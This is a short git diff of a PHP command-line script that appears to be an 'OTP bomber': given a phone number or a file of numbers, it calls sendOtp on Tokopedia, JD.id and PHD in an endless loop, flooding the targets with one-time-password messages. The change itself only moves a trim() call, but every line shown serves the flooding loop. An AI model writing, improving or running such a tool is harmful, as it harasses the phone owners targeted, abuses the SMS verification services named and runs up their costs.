@@ -70,12 +70,13 @@ if(!isset($argv[1])) {
 }
 try {
     $bom=new Otp();
+    $argv[1]=trim($argv[1]);
     if(is_numeric($argv[1])) {
-        $bom->sendOtp(trim($argv[1]),'tokopedia');
+        $bom->sendOtp($argv[1],'tokopedia');
         while(1) {
             fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1].']'.$X);
-            $bom->sendOtp(trim($argv[1]),'jdid');
-            $bom->sendOtp(trim($argv[1]),'phd');
+            $bom->sendOtp($argv[1],'jdid');
+            $bom->sendOtp($argv[1],'phd');
         }
     }
     else if(file_exists($argv[1])) {
@@ -84,9 +85,9 @@ try {
         while(1) {
             for($x=0;$x<$count;$x++) {
                 fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X);
-                $bom->sendOtp(trim($argv[1][$x]),'tokopedia');
-                $bom->sendOtp(trim($argv[1][$x]),'jdid');
-                $bom->sendOtp(trim($argv[1][$x]),'phd');
+                $bom->sendOtp($argv[1][$x],'tokopedia');
+                $bom->sendOtp($argv[1][$x],'jdid');
+                $bom->sendOtp($argv[1][$x],'phd');
             }
         }
     }
